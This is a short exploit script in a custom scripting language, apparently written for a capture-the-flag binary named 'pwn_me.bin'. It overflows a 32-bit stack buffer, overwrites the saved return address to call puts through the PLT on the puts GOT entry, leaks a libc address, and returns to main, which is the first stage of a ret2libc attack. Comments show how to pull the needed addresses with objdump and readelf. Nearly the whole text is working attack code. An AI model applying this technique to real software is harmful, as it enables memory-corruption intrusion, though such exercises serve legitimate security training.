
act exploit():
  //                                "saved_ebp    "saved_eip
  bv bof="A"x32 . "1111" . "2222" . "3333"      . "4444"     . "5555" . "6666"
  bv offset="A"x32 . "1111" . "2222" . "3333"
  bv ret1 = 0xdeadbeef:i32
  bv puts_got = 0x0804c00c:i32 //objdump -R pwn_me.bin | grep puts  OR readelf -r pwn_me.bin | grep puts
  bv puts_plt = 0x08049060:i32 //objdump -d -j .plt pwn_me.bin      OR readelf -x .plt pwn_me.bin
  bv main = 0x080491e6:i32


  bv payload = offset . puts_plt . main . puts_got . offset ."\n"
  dbghex payload
  write( payload )
  
  // Read until the expected string pattern
  bv output = read("you have a great name.\n")
  dbgascii "First read complete"
  dbghex output
  
  // Read the leaked address (should be 4 bytes for 32-bit address)
  bv leak = read(4)
  dbgascii "Received leak:"
  dbghex leak
  
  return leak

submit:
  return exploit()
